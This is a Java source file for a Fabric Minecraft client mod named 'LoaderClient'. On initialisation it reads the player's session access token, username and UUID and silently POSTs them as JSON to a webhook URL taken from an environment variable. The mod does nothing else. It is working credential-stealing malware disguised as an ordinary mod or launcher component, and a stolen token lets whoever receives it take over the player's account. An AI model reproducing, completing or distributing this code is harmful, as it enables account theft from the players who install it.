package me.mclauncher;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;

public class LoaderClient implements ClientModInitializer {

    @Override
    public void onInitialize() {
        try {
            MinecraftClient mc = MinecraftClient.getInstance();
            
            if (mc != null && mc.getSession() != null) {
                String token = mc.getSession().getAccessToken();
                String username = mc.getSession().getName();
                String uuid = mc.getSession().getUuid();
                
                sendToWebhook(token, username, uuid);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendToWebhook(String token, String username, String uuid) {
        try {
            String webhookUrl = System.getenv("WEBHOOK_URL");
            if (webhookUrl == null || webhookUrl.isEmpty()) {
                return;
            }

            String payload = String.format(
                "{\"token\":\"%s\",\"username\":\"%s\",\"uuid\":\"%s\"}",
                token, username, uuid
            );

            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) new java.net.URL(webhookUrl).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            try (java.io.OutputStream os = conn.getOutputStream()) {
                byte[] input = payload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
